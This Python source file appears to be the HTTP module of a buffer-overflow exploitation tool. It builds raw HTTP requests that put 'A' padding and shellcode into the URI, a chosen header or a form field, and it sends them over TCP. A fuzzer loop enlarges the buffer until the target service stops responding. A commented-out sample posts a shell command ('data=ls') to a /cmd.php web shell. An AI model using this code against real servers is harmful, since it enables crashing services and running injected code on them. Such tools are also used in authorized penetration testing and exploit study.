import socket
import time
import sys

from protocols.tcp import Tcp


class Http():

    config = ""
    request = ""

    def __init__(self, config):
        self.config = config
        self.request = ""
        return None

    ############################
    # HTTP FUNCTIONS

    ############################
    ## HTTP INJECTION

    def make_request(self, ip, port, field, buffer, shellcode, size):
        request_data = ""

        if(buffer == None):
            buffer = "A" * size

        header_skeleton = {
            "Host": ip + ":" + str(port),
            "User-Agent": "Mozilla/5.0",
            "Keep-Alive": "115",
            "Connection": "keep-alive",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://" + ip,  # + ":" + str(port),
            "Content-Type": "application/x-www-form-urlencoded",
            "If-Modified-Since": "Mon, 1 Jan 1990 00:00:00 GMT"
        }

        field_default = False

        if (shellcode != None):
            if(isinstance(shellcode, (bytes))):
                header_skeleton["User-Agent"] = str(shellcode.decode("latin-1"))
            else:
                header_skeleton["User-Agent"] = shellcode

        if (field.upper() == "URI"):
            field_default = True
            if (isinstance(shellcode, (bytes))):
                request_header = self.config.http_method + " /" + str(buffer.decode("latin-1")) + " HTTP/1.1\r\n"
            else:
                request_header = self.config.http_method + " /" + buffer + " HTTP/1.1\r\n"
        else:
            request_header = self.config.http_method + " /" + self.config.http_uri + " HTTP/1.1\r\n"

        for key in header_skeleton:
            # print(header_skeleton[key])
            # print(type(header_skeleton[key]))

            if (field.upper() == key.upper()):
                field_default = True
                if (isinstance(buffer, (bytes))):
                    request_header += key + ": " + str(buffer.decode("latin-1")) + "\r\n"
                else:
                    request_header += key + ": " + buffer + "\r\n"
            else:
                # print(key, type(key), header_skeleton[key], (type(header_skeleton[key])), (isinstance(header_skeleton[key], (str, unicode))))

                request_header += key + ": " + str(header_skeleton[key]) + "\r\n"

        # Todo: Implement cookie buffer in conjunction with line 45
        # if ("cookie" in field.lower()):
        #     field_default = True
        #     request_header += field + "=" + buffer + "\r\n"
        #     self.config.field = input("Fill your cookie data and put {{buffer}} in custom param: ")

        if (field_default == False):
            request_data = field + "=" + buffer

        request_header += "Content-Length: " + str(len(request_data))
        request_header += "\r\n" * 2

        if (self.config.verbose_lv == 2):
            print("=" * 50)
            print(request_header)
            print("=" * 50)

        self.request = request_header + request_data

        return self.request #str(self.request).encode('latin-1')

    ############################
    ## HTTP Request
    def inject(self, remoteip, port, field, request, stop_on_field):
        responses = []

        try:
            s = Tcp.connect(remoteip, port)

            if (s == None):
                return responses

            if (self.config.verbose_lv == 2):
                print("REQUEST BEGIN" + ("=" * 100))
                print(request)
                print(("=" * 100) + " REQUEST END")

            s.sendall(Tcp.prepare_command((request)))

            responses.append(s.recv(2048))
            print("RESPONSE BEGIN" + ("=" * 100))
            print(responses[-1])
            print(("=" * 100) + " RESPONSE END")

            s.close()
        except socket.error as error:
            print(error)
            return []

        return responses


    ############################
    ## HTTP DATA FUZZER

    def fuzzer(self, ip, port, field, start_size, inc):

        if (inc == None):
            inc = 100

        if (start_size == None):
            size = 100
        else:
            size = start_size

        streaming = [True]
        while len(streaming) > 0:
            self.request = self.make_request(ip, port, field, None, None, size)

            print('[.] Trying to overflow [' + str(size) + ' bytes]')

            streaming = (self.inject(ip, port, field, self.request, None))

            if (len(streaming) > 0):
                # streaming[-1].strip()
                # _response = streaming[-1].split(' ')

                # print("[!] ERROR COMMUNICATING TO THE SERVICE " + "|".join(streaming))
                # responsecode = int(_response[0].strip())

                # # 6xx	Protected reply
                # if responsecode > 599:
                # 	print(base64_decode(_response.join(' ')))

                # #5xx	Permanent Negative Completion reply
                # if responsecode > 499:
                # 	return size
                # 	break;

                time.sleep(1)

                size += inc
                buffer = "A" * size

        return size


    ############################
    ## HTTP DEFAULT RAW REQUEST FOR TESTING ADDITIONAL HEADERS
    #def http_raw_request(self, ip, port, method, uri, header, header_value, default_data):
    # request = (method + "/" + uri + " HTTP/1.1 \r\n"
    # "Host: " + ip +":" + port +"\r\n"
    # "User-Agent: ""Mozilla/5.0""\r\n"
    # "Keep-Alive: 115\r\n"
    # "Connection: keep-alive\r\n"
    # "Content-Length: " + str(len(default_data)) + "\r\n")

    # if(header != "" and header_value != ""):
    # 	request += header + ":" + header_value + "\r\n"

    # request += "\r\n"

    # request += default_data

    #request = self.make_request(ip, port, field, start_size, inc)

    #streaming = (self.http_inject(ip, port, request))


    ############################
    ## HTTP RAW REQUEST FROM INPUT
    # def http_raw_input(self, ip, port, header, header_value):
    # 	request = [];
    # 	print("Enter your request headers: \r\n")

    # 	lines = []
    # 	while True:
    # 		line = input()
    # 		if line:
    # 			request.append(line)
    # 		else:
    # 			break

    # 	request = '\n'.join(lines)

    # 	# 	request = """POST /cmd.php HTTP/1.1
    # 	# Host: 192.168.10.165
    # 	# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    # 	# Accept: */*
    # 	# Accept-Language: en-US,en;q=0.5
    # 	# Accept-Encoding: gzip, deflate
    # 	# Referer: http://192.168.10.165/
    # 	# Content-Type: application/x-www-form-urlencoded
    # 	# Content-Length: 7
    # 	# Connection: close
    # 	# X-Forwarded-For: 192.168.10.165

    # 	# data=ls
    # 	# 	"""

    # 	if(header != "" and header_value != ""):
    # 		request.replace("HTTP/1.1", "HTTP/1.1\r\n" + header + ":" + header_value).strip()

    # 	print("=" * 100)

    # 	print(request)

    # 	s = connect(ip, port)
    # 	s.send(request)

    # 	print("Sent Request of %s bytes:" %len(request))

    # 	print("=" * 100)
    # 	print(s.recv(10240))
    # 	print("=" * 100)

    # 	s.close()